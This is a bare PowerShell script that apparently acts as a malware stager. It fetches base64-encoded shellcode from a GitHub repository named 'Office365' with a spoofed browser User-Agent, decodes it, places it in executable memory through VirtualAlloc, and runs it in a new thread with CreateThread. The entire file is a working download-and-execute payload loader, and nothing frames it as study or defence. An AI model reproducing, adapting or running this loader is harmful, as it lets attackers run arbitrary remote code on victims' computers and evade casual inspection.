try {
    $url = "https://raw.githubusercontent.com/wolfgangphelan994924/Office365/main/shellcode_b64.txt"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $b64 = $wc.DownloadString($url).Trim()
    $bytes = [Convert]::FromBase64String($b64)
    
    $sig = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
"@
    $kern = Add-Type -MemberDefinition $sig -Name "Kernel32" -PassThru
    
    $ptr = $kern::VirtualAlloc([IntPtr]::Zero, [UIntPtr]$bytes.Length, 0x1000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
    $thread = $kern::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    $kern::WaitForSingleObject($thread, 0xFFFFFFFF)
} catch {
    Write-Host "Error: " + $_.Exception.Message
}